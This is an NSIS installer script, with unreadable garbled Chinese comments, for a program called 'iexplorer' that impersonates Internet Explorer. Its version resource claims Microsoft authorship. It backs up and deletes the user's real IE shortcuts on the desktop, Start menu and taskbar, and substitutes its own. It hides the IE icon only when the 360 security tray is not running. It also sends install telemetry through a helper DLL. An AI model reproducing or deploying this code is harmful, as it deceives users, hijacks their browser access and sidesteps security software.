;��̬��ȡ������
Var str_ChannelID
;---------------------------ȫ�ֱ���ű�Ԥ����ĳ���-----------------------------------------------------
;��װͼ���·������
!define MUI_ICON "bin2\iexplore.ico"
;ж��ͼ���·������
!define MUI_UNICON "bin2\iexplore.ico"

!define INSTALL_CHANNELID "0001"

!define PRODUCT_NAME "iexplorer"
!define SHORTCUT_NAME "iexplorer"
!define PRODUCT_VERSION "8.0.0.17"
!define VERSION_LASTNUMBER "B17"
!define NeedSpace 10240

!define EM_BrandingText "${PRODUCT_NAME}${PRODUCT_VERSION}"
!define PRODUCT_PUBLISHER "iexplorer"
!define PRODUCT_WEB_SITE ""
!define PRODUCT_DIR_REGKEY "Software\Microsoft\Windows\CurrentVersion\App Paths\iexplorer.exe"
!define PRODUCT_UNINST_KEY "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT_NAME}"
!define PRODUCT_UNINST_ROOT_KEY "HKLM"
!define PRODUCT_MAININFO_FORSELF "Software\${PRODUCT_NAME}"

;ж�ذ����أ��벻Ҫ���״򿪣�
!define SWITCH_CREATE_UNINSTALL_PAKAGE 1
!ifdef SWITCH_CREATE_UNINSTALL_PAKAGE
	!define EM_OUTFILE_NAME "uninst.exe"
!else
	!define EM_OUTFILE_NAME "iesetup-${PRODUCT_VERSION}_inner.exe"
!endif

;CRCCheck on
;---------------------------�������ѹ�����ͣ�Ҳ����ͨ���������ű����ƣ�------------------------------------
SetCompressor /SOLID lzma
SetCompressorDictSize 32
BrandingText "${EM_BrandingText}"
SetCompress force
SetDatablockOptimize on
;XPStyle on
; ------ MUI �ִ����涨�� (1.67 �汾���ϼ���) ------
!include "MUI2.nsh"
!include "WinCore.nsh"
;�����ļ�����ͷ�ļ�
!include "FileFunc.nsh"
!include "WinMessages.nsh"
!include "WordFunc.nsh"

!insertmacro MUI_LANGUAGE "SimpChinese"
SetFont ���� 9
RequestExecutionLevel admin

VIProductVersion ${PRODUCT_VERSION}
VIAddVersionKey /LANG=2052 "ProductName" "Microsoft(R) Windows(R) Operating System"
VIAddVersionKey /LANG=2052 "Comments" ""
VIAddVersionKey /LANG=2052 "CompanyName" ""
;VIAddVersionKey /LANG=2052 "LegalTrademarks" "GreenShield"
VIAddVersionKey /LANG=2052 "LegalCopyright" "(C) Microsoft Corporation. All rights reserved."
VIAddVersionKey /LANG=2052 "FileDescription" "Internet Explorer"
VIAddVersionKey /LANG=2052 "FileVersion" ${PRODUCT_VERSION}
VIAddVersionKey /LANG=2052 "ProductVersion" ${PRODUCT_VERSION}
VIAddVersionKey /LANG=2052 "OriginalFilename" ""


;------------------------------------------------------MUI �ִ����涨���Լ���������------------------------
;Ӧ�ó�����ʾ����
Name "${SHORTCUT_NAME} ${PRODUCT_VERSION}"
;Ӧ�ó������·��
!ifdef SWITCH_CREATE_UNINSTALL_PAKAGE
	OutFile "bin2\_uninst.exe"
!else
	OutFile "bin2\${EM_OUTFILE_NAME}"
!endif
;InstallDir "$PROGRAMFILES\ldthost"
InstallDirRegKey HKLM "${PRODUCT_UNINST_KEY}" "UninstallString"

Section MainSetup
SectionEnd

Function GetLastPart
  Exch $0 ; chop char
  Exch
  Exch $1 ; input string
  Push $2
  Push $3
  StrCpy $2 0
  loop:
    IntOp $2 $2 - 1
    StrCpy $3 $1 1 $2
    StrCmp $3 "" 0 +3
      StrCpy $0 ""
      Goto exit2
    StrCmp $3 $0 exit1
    Goto loop
  exit1:
    IntOp $2 $2 + 1
    StrCpy $0 $1 "" $2
  exit2:
    Pop $3
    Pop $2
    Pop $1
    Exch $0 ; output string
FunctionEnd

Var boolIsSilent
Function UpdateChanel
	StrCpy $boolIsSilent "false"
	System::Call "kernel32::GetModuleFileName(i 0, t R2R2, i 256) ? u"
	Push $R2
	Push "\"
	Call GetLastPart
	Pop $R1
	${WordFind} "$R1" "_silent" +1 $R5
	${If} $R1 != $R5
		StrCpy $boolIsSilent "true"
	${Else}
		StrCpy $boolIsSilent "false"
	${EndIf}
	${WordFind} "$R1" "_" +2 $R3
	${If} $R3 == 0
	${OrIf} $R3 == ""
		StrCpy $str_ChannelID ${INSTALL_CHANNELID}
	${ElseIf} $R1 == $R3
		StrCpy $str_ChannelID "unknown"
	${Else}
		${WordFind} "$R3" "." +1 $R4
		StrCpy $str_ChannelID $R4
	${EndIf}
	
	ReadRegStr $R0 HKCU "SOFTWARE\${PRODUCT_NAME}" "InstallSource"
	${If} $R0 != 0
	${AndIf} $R0 != ""
	${AndIf} $R0 != "unknown"
		StrCpy $str_ChannelID $R0
	${EndIf}
	WriteRegStr HKCU "SOFTWARE\${PRODUCT_NAME}" "InstallSource" "$str_ChannelID"
FunctionEnd

Function GetCommandLine
	System::Call "kernel32::GetCommandLineA() t.R1"
	System::Call "kernel32::GetModuleFileName(i 0, t R2R2, i 256)"
	${WordReplace} $R1 $R2 "" +1 $R3
	${StrFilter} "$R3" "-" "" "" $R4
FunctionEnd

Var Bool_IsUpdate
Function .onInit
	${If} ${SWITCH_CREATE_UNINSTALL_PAKAGE} == 1 
		WriteUninstaller "$EXEDIR\..\iexplorer\uninst.exe"
		Abort
	${EndIf}
	System::Call "kernel32::CreateMutexA(i 0, i 0, t 'iesetup_{113CFDBC-6426-4b1a-9539-24ADF327AC93}') i .r1 ?e"
	Pop $R0
	StrCmp $R0 0 +2
	Abort
	Call UpdateChanel
	;�ж��Ƿ񸲸ǰ�װ
	StrCpy $Bool_IsUpdate 0
	ReadRegStr $2 HKCU "SOFTWARE\${PRODUCT_NAME}" "Path"
	IfFileExists $2 0 StartInstall
		StrCpy $Bool_IsUpdate 1
		${GetFileVersion} $2 $1
		${VersionCompare} $1 ${PRODUCT_VERSION} $3
		${If} $3 == "2" ;�Ѱ�װ�İ汾���ڸð汾
			Goto StartInstall
		${ElseIf} $boolIsSilent == "false"
			Call GetCommandLine
			${GetOptions} $R4 "/write"  $R0
			IfErrors 0 +2
			Abort
			Goto StartInstall
		${EndIf}
	StartInstall:
	;�ж�ϵͳ
	SetOutPath "$TEMP\${PRODUCT_NAME}"
	SetOverwrite on
	File "bin\YBSetUpHelper.dll"
	File "ieneed\Microsoft.VC90.CRT.manifest"
	File "ieneed\msvcp90.dll"
	File "ieneed\msvcr90.dll"
	File "ieneed\Microsoft.VC90.ATL.manifest"
	File "ieneed\ATL90.dll"
	
	;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::IsOsUac() i.r0"
	;${If} $0 == 1
	;	Abort
	;${EndIf}
	;��ȡ��װ·��
	StrCpy $1 ${NSIS_MAX_STRLEN}
	StrCpy $0 ""
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetProfileFolder(t) i(.r0).r2"
	;�ͷ�exe��xar�Լ�ж�س���
	SetOutPath "$0\${PRODUCT_NAME}"
	SetOverwrite on
	File /r "${PRODUCT_NAME}\*.*"
	;�ͷ�xlue����������ļ�
	SetOutPath "$0\${PRODUCT_NAME}\program"
	SetOverwrite on
	File /r "ieneed\*.*"
	;�ͷ�ie����
	SetOutPath "$0\IECFG"
	SetOverwrite off
	File /r "ie_config\*.*"
	;��������ļ��� ����YBYL.exe���඼����
	;CopyFiles /silent "$R1\program\*.*" "$R0\${PRODUCT_NAME}\program"
	;Delete "$R0\${PRODUCT_NAME}\program\YBYL.exe"
	;����ͼ��
	Call CreateDeskIcon
	;ˢ��ͼ��
	System::Call "shell32::SHChangeNotify(l, l, i, i) v (0x08000000, 0, 0, 0)"
	;�ͷ������ļ���Ԥ����
	;�ϱ�
	${If} $Bool_IsUpdate == 0
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'install', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1) "
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'installmethod', t '${VERSION_LASTNUMBER}', t '0', i 1) "
	${Else}
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'update', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1)"
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'updatemethod', t "${VERSION_LASTNUMBER}", t '0', i 1)"
	${EndIf}  
	
	;дע�����Ϣ
	WriteRegStr HKCU "SOFTWARE\iexplorer" "Path" "$0\iexplorer\program\iexplore.exe"
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetPeerID(t) i(.r2).r3"
	WriteRegStr HKCU "SOFTWARE\iexplorer" "PeerId" "$2"
	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstallSource" $str_ChannelID
	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstDir" "$0\iexplorer"
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetTime(*l) i(.r2).r1"
	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstallTimes" "$2"
	
	;д��ͨ�õ�ע�����Ϣ
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\App Paths\iexplorer.exe" "" "$0\iexplorer\program\iexplore.exe"
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayName" "Internet Explorer"
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "UninstallString" "$0\iexplorer\uninst.exe"
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayIcon" "$0\iexplorer\program\iexplore.exe"
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayVersion" "${PRODUCT_VERSION}"
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "URLInfoAbout" ""
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "Publisher" "iexplorer"
	;д��ie��������Ϣ
	WriteRegDWORD HKCU "Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION" "iexplore.exe" 0x2af8
	
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SoftExit() ? u"
	Abort
FunctionEnd

Function CreateDeskIcon
	StrCpy $1 ${NSIS_MAX_STRLEN}
	StrCpy $0 ""
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetProfileFolder(t) i(.r0).r2"
	${If} $0 == ""
	${OrIf} $0 == 0
		Abort
	${EndIf}
	SetOutPath "$PROGRAMFILES\Internet Explorer"
	IfFileExists "$0\IECFG\lnkbak" +2 0
	CreateDirectory "$0\IECFG\lnkbak"
	;�ȱ���,������Ϊ������ie
	${If} $Bool_IsUpdate == 0
		IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 +4
			WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
			CopyFiles /silent "$SMPROGRAMS\Internet Explorer.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk"
			Delete "$SMPROGRAMS\Internet Explorer.lnk"
		IfFileExists "$DESKTOP\Internet Explorer.lnk" 0 +4
			WriteRegStr HKCU "SOFTWARE\iexplorer" "DESKTOP" "1"
			CopyFiles /silent "$DESKTOP\Internet Explorer.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk"
			Delete "$DESKTOP\Internet Explorer.lnk"
	${EndIf}
	;����IEͼ�꣬ �ж�360���̲��ڲ���
	FindProcDLL::FindProc "360tray.exe"
	${If} $R0 == 0
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::HideIEIcon(i 1)"
		WriteRegStr HKCU "SOFTWARE\iexplorer" "HideIEIcon" "1"
	${EndIf}
	;���1
	CreateShortCut "$SMPROGRAMS\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom startmenuprograms" "" "" "" "" "���� Internet Explorer �����"
	;���2
	;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::ReplaceIcon(t '$0\${PRODUCT_NAME}\program\iexplore.exe')"
	CreateShortCut "$DESKTOP\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom desktop" "" "" "" "" "���� Internet Explorer �����"
	;���3
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::IsOsUac() i.r2"
	${If} $2 == 1 ;win7
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetUserPinPath(t .r3)"
		${If} $3 != "" 
		${AndIf} $3 != 0
			IfFileExists "$3\TaskBar\Internet Explorer.lnk" 0 +8
				${If} $Bool_IsUpdate == 0
					WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
					CopyFiles /silent "$3\TaskBar\Internet Explorer.lnk" "$0\IECFG\lnkbak\QUICKLAUNCH_Internet Explorer.lnk"
				${EndIf}
				ExecShell taskbarunpin "$3\TaskBar\Internet Explorer.lnk"
				StrCpy $R0 "$3\TaskBar\Internet Explorer.lnk"
				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t "$R0")"
				Sleep 500
				Sleep 1
				Sleep 1
			IfFileExists "$3\TaskBar\���� Internet Explorer �����.lnk" 0 +8
				${If} $Bool_IsUpdate == 0
					WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
					CopyFiles /silent "$3\TaskBar\���� Internet Explorer �����.lnk" "$0\IECFG\lnkbak\QUICKLAUNCH_���� Internet Explorer �����.lnk"
				${EndIf}
				ExecShell taskbarunpin "$3\TaskBar\���� Internet Explorer �����.lnk"
				StrCpy $R0 "$3\TaskBar\���� Internet Explorer �����.lnk"
				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t "$R0")"
				Sleep 500
				Sleep 1
				Sleep 1
			SetOutPath "$PROGRAMFILES\Internet Explorer"
			CreateShortCut "$0\${PRODUCT_NAME}\program\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom toolbar" "" "" "" "" "���� Internet Explorer �����"
			ExecShell taskbarpin "$0\${PRODUCT_NAME}\program\Internet Explorer.lnk" "/sstartfrom toolbar"
			IfFileExists "$STARTMENU\Internet Explorer.lnk" 0 +6
				${If} $Bool_IsUpdate == 0
					WriteRegStr HKCU "SOFTWARE\iexplorer" "STARTMENU" "1"
					CopyFiles /silent "$STARTMENU\Internet Explorer.lnk" "$0\IECFG\lnkbak\STARTMENU_Internet Explorer.lnk"
				${EndIf}
				ExecShell startunpin "$3\StartMenu\Internet Explorer.lnk"
				Sleep 1000
				Sleep 1
				Sleep 1
			IfFileExists "$STARTMENU\Internet.lnk" 0 +6
				${If} $Bool_IsUpdate == 0
					WriteRegStr HKCU "SOFTWARE\iexplorer" "STARTMENU" "1"
					CopyFiles /silent "$STARTMENU\Internet.lnk" "$0\IECFG\lnkbak\STARTMENU_Internet.lnk"
				${EndIf}
				ExecShell startunpin "$3\StartMenu\Internet.lnk"
				Sleep 1000
				Sleep 1
				Sleep 1
			CreateShortCut "$STARTMENU\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom startbar" "" "" "" "" "���� Internet Explorer �����"
			StrCpy $R0 "$STARTMENU\Internet Explorer.lnk"
			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
			Sleep 200
			ExecShell startpin "$STARTMENU\Internet Explorer.lnk" "/sstartfrom startbar"
		${EndIf}
	${Else}
		IfFileExists "$QUICKLAUNCH\Internet Explorer.lnk" 0 ENDIF1
			${If} $Bool_IsUpdate == 0
				WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
				CopyFiles /silent "$QUICKLAUNCH\Internet Explorer.lnk" "$0\IECFG\lnkbak\QUICKLAUNCH_Internet Explorer.lnk"
			${EndIf}
			Delete "$QUICKLAUNCH\Internet Explorer.lnk"
		ENDIF1:
		IfFileExists "$QUICKLAUNCH\Internet.lnk" 0 ENDIF6
			${If} $Bool_IsUpdate == 0
				WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
				CopyFiles /silent "$QUICKLAUNCH\Internet.lnk" "$0\IECFG\lnkbak\QUICKLAUNCH_Internet.lnk"
			${EndIf}
			Delete "$QUICKLAUNCH\Internet.lnk"
		ENDIF6:
		IfFileExists "$QUICKLAUNCH\���� Internet Explorer �����.lnk" 0 ENDIF2
			${If} $Bool_IsUpdate == 0
				WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
				CopyFiles /silent "$QUICKLAUNCH\���� Internet Explorer �����.lnk" "$0\IECFG\lnkbak\QUICKLAUNCH_���� Internet Explorer �����.lnk"
			${EndIf}
			Delete "$QUICKLAUNCH\���� Internet Explorer �����.lnk"
		ENDIF2:
		CreateShortCut "$QUICKLAUNCH\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom toolbar" "" "" "" "" "���� Internet Explorer �����" 
		IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 ENDIF3
			${If} $Bool_IsUpdate == 0
				WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
				CopyFiles /silent "$SMPROGRAMS\Internet Explorer.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk"
			${EndIf}
			system::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$SMPROGRAMS\Internet Explorer.lnk')"
			Delete "$SMPROGRAMS\Internet Explorer.lnk"
		ENDIF3:
		IfFileExists "$SMPROGRAMS\Internet.lnk" 0 ENDIF4
			${If} $Bool_IsUpdate == 0
				WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
				CopyFiles /silent "$SMPROGRAMS\Internet.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_Internet.lnk"
			${EndIf}
			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$SMPROGRAMS\Internet.lnk')"
			Delete "$SMPROGRAMS\Internet.lnk"
		ENDIF4:
		IfFileExists "$SMPROGRAMS\���� Internet Explorer �����.lnk" 0 ENDIF5
			${If} $Bool_IsUpdate == 0
				WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
				CopyFiles /silent "$SMPROGRAMS\���� Internet Explorer �����.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_���� Internet Explorer �����.lnk"
			${EndIf}
			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$SMPROGRAMS\���� Internet Explorer �����.lnk')"
			Delete "$SMPROGRAMS\���� Internet Explorer �����.lnk"
		ENDIF5:
		CreateShortCut "$SMPROGRAMS\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom startmenuprograms" "" "" "" "" "���� Internet Explorer �����"
		SetOutPath "$TEMP\${PRODUCT_NAME}"
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b true, t '$SMPROGRAMS\Internet Explorer.lnk')"
	${EndIf}
	;������������
FunctionEnd

/****************************************************/
;ж��
/****************************************************/
Function un.UpdateChanel
	ReadRegStr $R4 HKCU "SOFTWARE\${PRODUCT_NAME}" "InstallSource"
	${If} $R4 == 0
	${OrIf} $R4 == ""
		StrCpy $str_ChannelID "unknown"
	${Else}
		StrCpy $str_ChannelID $R4
	${EndIf}
FunctionEnd

Function un.DeleteIcon
	;ɾ��
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::ReductionIcon()"
	;���5
	;WriteRegStr HKCU "Software\Clients\StartMenuInternet\IEXPLORE.EXE\shell\open\command" "" ""
	IfFileExists "$DESKTOP\Internet Explorer.lnk" 0 +2
		Delete "$DESKTOP\Internet Explorer.lnk"
	;IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 +2
	;	Delete "$SMPROGRAMS\Internet Explorer.lnk"
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::IsOsUac() i.r2"
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'IsOsUac return $2')"
	${If} $2 == 1 ;win7
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetUserPinPath(t .r3)"
		ExecShell taskbarunpin "$3\TaskBar\Internet Explorer.lnk"
		StrCpy $R0 "$3\TaskBar\Internet Explorer.lnk"
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t "$R0")"
		Sleep 1000
		
		ExecShell startunpin "$3\StartMenu\Internet Explorer.lnk"
		;System::Call "shell32::ShellExecute(i 0, t 'startunpin', t '$3\StartMenu\Internet Explorer.lnk', t 0, t 0, i 0) ?e"
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'startunpin path = $3\StartMenu\Internet Explorer.lnk')"
		StrCpy $R0 "$3\StartMenu\Internet Explorer.lnk"
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t "$R0")"
		Sleep 1000
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::Pin2StartMenuWin7(t '$3\StartMenu\Internet Explorer.lnk') "
		IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 +2
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::DeleteFileEx(t '$SMPROGRAMS\Internet Explorer.lnk') "
	${Else}
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$SMPROGRAMS\Internet Explorer.lnk')"
		IfFileExists "$QUICKLAUNCH\Internet Explorer.lnk" 0 +2
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::DeleteFileEx(t '$QUICKLAUNCH\Internet Explorer.lnk') "
		IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 +2
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::DeleteFileEx(t '$SMPROGRAMS\Internet Explorer.lnk') "
	${EndIf}
	;��ԭ
	ReadRegStr $R4 HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE" "path"
	ReadRegStr $R5 HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE" ""
	StrCpy $R6 "0"
	StrCpy $R7 "0"
	StrCpy $R8 "0"
	StrCpy $R9 "0"
	StrCpy $9 "0"
	ReadRegStr $R6 HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH"
	ReadRegStr $R7 HKCU "SOFTWARE\iexplorer" "SMPROGRAMS"
	ReadRegStr $R8 HKCU "SOFTWARE\iexplorer" "STARTMENU"
	ReadRegStr $R9 HKCU "SOFTWARE\iexplorer" "HideIEIcon"
	ReadRegStr $9 HKCU "SOFTWARE\iexplorer" "DESKTOP"
	
	StrCpy $1 ${NSIS_MAX_STRLEN}
	StrCpy $0 ""
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetProfileFolder(t) i(.r0).r3"
	
	${If} $2 == 1
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetUserPinPath(t .r3)"
		${If} $3 != "" 
		${AndIf} $3 != 0
			SetOutPath "$R4"
			${If} $R6 == "1" 
				;CreateShortCut "$R4\Internet Explorer.lnk" "$R5" "" "" "" "" "" "���� Internet Explorer �����"
				IfFileExists "$0\IECFG\lnkbak\QUICKLAUNCH_Internet Explorer.lnk" 0 +3
				CopyFiles /silent "$0\IECFG\lnkbak\QUICKLAUNCH_Internet Explorer.lnk" "$3\TaskBar\Internet Explorer.lnk"
				ExecShell taskbarpin "$3\TaskBar\Internet Explorer.lnk"
				Goto TASKRERSTOREOK
				IfFileExists "$0\IECFG\lnkbak\QUICKLAUNCH_���� Internet Explorer �����.lnk" 0 +3
				CopyFiles /silent "$0\IECFG\lnkbak\QUICKLAUNCH_���� Internet Explorer �����.lnk" "$3\TaskBar\���� Internet Explorer �����.lnk"
				ExecShell taskbarpin "$3\TaskBar\���� Internet Explorer �����.lnk"
				Goto TASKRERSTOREOK
				IfFileExists "$0\IECFG\lnkbak\QUICKLAUNCH_Internet.lnk" 0 +3
				CopyFiles /silent "$0\IECFG\lnkbak\QUICKLAUNCH_Internet.lnk" "$3\TaskBar\Internet.lnk"
				ExecShell taskbarpin "$3\TaskBar\Internet.lnk"
				TASKRERSTOREOK:
			${EndIf}
			${If} $R8 == "1" 
				IfFileExists "$0\IECFG\lnkbak\STARTMENU_Internet Explorer.lnk" 0 +6
				CopyFiles /silent "$0\IECFG\lnkbak\STARTMENU_Internet Explorer.lnk" "$STARTMENU\Internet Explorer.lnk"
				StrCpy $R0 "$STARTMENU\Internet Explorer.lnk"
				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
				Sleep 1000
				ExecShell startpin "$STARTMENU\Internet Explorer.lnk"
				Goto StartMenuRestoreOK
				IfFileExists "$0\IECFG\lnkbak\STARTMENU_Internet.lnk" 0 +6
				CopyFiles /silent "$0\IECFG\lnkbak\STARTMENU_Internet.lnk" "$STARTMENU\Internet.lnk"
				StrCpy $R0 "$STARTMENU\Internet Explorer.lnk"
				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
				Sleep 1000
				ExecShell startpin "$STARTMENU\Internet Explorer.lnk"
				Goto StartMenuRestoreOK
				IfFileExists "$0\IECFG\lnkbak\STARTMENU_���� Internet Explorer �����.lnk" 0 +6
				CopyFiles /silent "$0\IECFG\lnkbak\STARTMENU_���� Internet Explorer �����.lnk" "$STARTMENU\���� Internet Explorer �����.lnk"
				StrCpy $R0 "$STARTMENU\���� Internet Explorer �����.lnk"
				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
				Sleep 1000
				ExecShell startpin "$STARTMENU\���� Internet Explorer �����.lnk"
				StartMenuRestoreOK:
			${EndIf}
			${If} $R7 == "1" 
				IfFileExists "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk" 0 +6
				CopyFiles /silent "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk" "$SMPROGRAMS\Internet Explorer.lnk"
				StrCpy $R0 "$SMPROGRAMS\Internet Explorer.lnk"
				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
				Sleep 1000
				ExecShell startpin "$SMPROGRAMS\Internet Explorer.lnk"
				Goto SMPROGRAMSRestoreOK
				IfFileExists "$0\IECFG\lnkbak\SMPROGRAMS_Internet.lnk" 0 +6
				CopyFiles /silent "$0\IECFG\lnkbak\SMPROGRAMS_Internet.lnk" "$SMPROGRAMS\Internet.lnk"
				StrCpy $R0 "$SMPROGRAMS\Internet Explorer.lnk"
				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
				Sleep 1000
				ExecShell startpin "$SMPROGRAMS\Internet Explorer.lnk"
				Goto SMPROGRAMSRestoreOK
				IfFileExists "$0\IECFG\lnkbak\SMPROGRAMS_���� Internet Explorer �����.lnk" 0 +6
				CopyFiles /silent "$0\IECFG\lnkbak\SMPROGRAMS_���� Internet Explorer �����.lnk" "$SMPROGRAMS\���� Internet Explorer �����.lnk"
				StrCpy $R0 "$SMPROGRAMS\���� Internet Explorer �����.lnk"
				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
				Sleep 1000
				ExecShell startpin "$SMPROGRAMS\���� Internet Explorer �����.lnk"
				SMPROGRAMSRestoreOK:
			${EndIf}
		${EndIf}
	${Else}
		${If} $R6 == "1" 
			;CreateShortCut "$QUICKLAUNCH\Internet Explorer.lnk" "$R5" "" "" "" "" "" "���� Internet Explorer �����" 
			IfFileExists "$0\IECFG\lnkbak\QUICKLAUNCH_Internet Explorer.lnk" 0 +2
			CopyFiles /silent "$0\IECFG\lnkbak\QUICKLAUNCH_Internet Explorer.lnk" "$QUICKLAUNCH\Internet Explorer.lnk"
			IfFileExists "$0\IECFG\lnkbak\QUICKLAUNCH_���� Internet Explorer �����.lnk" 0 +2
			CopyFiles /silent "$0\IECFG\lnkbak\QUICKLAUNCH_���� Internet Explorer �����.lnk" "$QUICKLAUNCH\���� Internet Explorer �����.lnk"
			IfFileExists "$0\IECFG\lnkbak\QUICKLAUNCH_Internet.lnk" 0 +2
			CopyFiles /silent "$0\IECFG\lnkbak\QUICKLAUNCH_Internet.lnk" "$QUICKLAUNCH\Internet.lnk"
		${EndIf}
		${If} $R7 == "1" 
			;CreateShortCut "$STARTMENU\Internet Explorer.lnk" "$R5" "" "" "" "" "" "���� Internet Explorer �����" 
			IfFileExists "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk" 0 +3
			CopyFiles /silent "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk" "$SMPROGRAMS\Internet Explorer.lnk"
			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b true, t '$SMPROGRAMS\Internet Explorer.lnk')"
			Goto ReStoreOK
			IfFileExists "$0\IECFG\lnkbak\SMPROGRAMS_Internet.lnk" 0 +3
			CopyFiles /silent "$0\IECFG\lnkbak\SMPROGRAMS_Internet.lnk" "$SMPROGRAMS\Internet.lnk"
